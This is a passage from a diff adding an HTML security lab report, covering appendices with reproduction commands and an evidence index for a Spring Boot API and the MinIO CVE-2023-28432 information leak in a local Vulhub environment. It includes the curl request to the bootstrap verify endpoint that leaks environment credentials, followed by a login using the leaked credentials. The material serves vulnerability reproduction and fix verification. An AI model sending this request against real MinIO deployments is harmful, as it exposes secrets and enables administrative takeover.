+    <a href="https://github.com/minio/minio/security/advisories/GHSA-6xvq-wj2x-3h3q">https://github.com/minio/minio/security/advisories/GHSA-6xvq-wj2x-3h3q</a></li>
+<li>MinIO fix commit <code>3b5dbf9</code> —
+    <a href="https://github.com/minio/minio/commit/3b5dbf90468b874e99253d241d16d175c2454077">https://github.com/minio/minio/commit/3b5dbf90468b874e99253d241d16d175c2454077</a></li>
+<li>Vulhub <code>minio/CVE-2023-28432</code> —
+    <a href="https://github.com/vulhub/vulhub/tree/master/minio/CVE-2023-28432">https://github.com/vulhub/vulhub/tree/master/minio/CVE-2023-28432</a></li>
+</ol>
+<div class="page-break"></div>
+
+<h2 id="appendix-a-reproduction-commands">Appendix A: reproduction commands</h2>
+<h3 id="a1-api">A.1 API</h3>
+<pre><code class="language-bash">export APP_DEMO_PASSWORD='Local-demo-2026!'
+mvn spring-boot:run
+mvn test
+</code></pre>
+<h3 id="a2-ci-checks">A.2 CI checks</h3>
+<pre><code class="language-bash">mvn -B -ntp -Psast -DskipTests compile spotbugs:check
+bash scripts/run-sca.sh
+</code></pre>
+<h3 id="a3-vulnerable-minio-environment">A.3 Vulnerable MinIO environment</h3>
+<pre><code class="language-bash">cd vulhub/minio/CVE-2023-28432
+docker compose up -d
+curl -i -X POST http://127.0.0.1:9000/minio/bootstrap/v1/verify
+</code></pre>
+<h3 id="a4-fixed-environment">A.4 Fixed environment</h3>
+<pre><code class="language-bash">cd vulhub/minio/CVE-2023-28432
+docker compose down
+cp /path/to/fixes/CVE-2023-28432/docker-compose.yml docker-compose.yml
+docker compose up -d
+curl -i -X POST http://127.0.0.1:9000/minio/bootstrap/v1/verify
+</code></pre>
+<h3 id="a5-regression">A.5 Regression</h3>
+<pre><code class="language-bash">docker run --rm --entrypoint sh --add-host=host.docker.internal:host-gateway \
+  minio/mc:latest -c '
+    mc alias set fixed http://host.docker.internal:9000 \
+      minioadmin minioadmin-vulhub &amp;&amp;
+    mc mb fixed/regression-check &amp;&amp;
+    mc ls fixed'
+</code></pre>
+<h2 id="appendix-b-evidence-index">Appendix B: evidence index</h2>
+<table>
+<thead>
+<tr>
+<th>Evidence</th>
+<th>Location</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>API screenshots (login, 401, XSS, isolation, tampered JWT)</td>
+<td><code>docs/screenshots/api/</code></td>
+</tr>
+<tr>
+<td>GitHub Actions overview</td>
+<td><code>docs/screenshots/ci/01_github_actions_all_checks_passed_39237435374.png</code></td>
+</tr>
+<tr>
+<td>SAST report</td>
+<td><code>docs/screenshots/ci/02_sast_report.png</code></td>
+</tr>
+<tr>
+<td>SCA report</td>
+<td><code>docs/screenshots/ci/03_sca_report_summary.png</code></td>
+</tr>
+<tr>
+<td>CVE environment and version</td>
+<td><code>docs/screenshots/cve/01_vulnerable_cluster.png</code></td>
+</tr>
+<tr>
+<td>CVE environment leak</td>
+<td><code>docs/screenshots/cve/02_exploit_env_leak.png</code></td>
+</tr>
+<tr>
+<td>Leaked credentials used for admin access</td>
+<td><code>docs/screenshots/cve/03_leaked_creds_impact.png</code></td>
+</tr>
+<tr>
+<td>Upstream fix diff</td>
+<td><code>docs/screenshots/cve/04_fix_diff.png</code></td>
+</tr>
+<tr>
+<td>Attack blocked after fix</td>
+<td><code>docs/screenshots/cve/05_exploit_blocked.png</code></td>
+</tr>
+<tr>
+<td>Regression after fix</td>
+<td><code>docs/screenshots/cve/06_regression_after_fix.png</code></td>
+</tr>
+<tr>
+<td>Raw CVE transcripts</td>
+<td><code>docs/cve/CVE-2023-28432/transcripts/</code></td>
+</tr>
+<tr>
+<td>MinIO source diff and NVD record</td>
+<td><code>docs/cve/CVE-2023-28432/source/</code></td>
+</tr>
+<tr>
+<td>Fixed compose file</td>
+<td><code>fixes/CVE-2023-28432/docker-compose.yml</code></td>
+</tr>
+</tbody>
+</table></body></html>
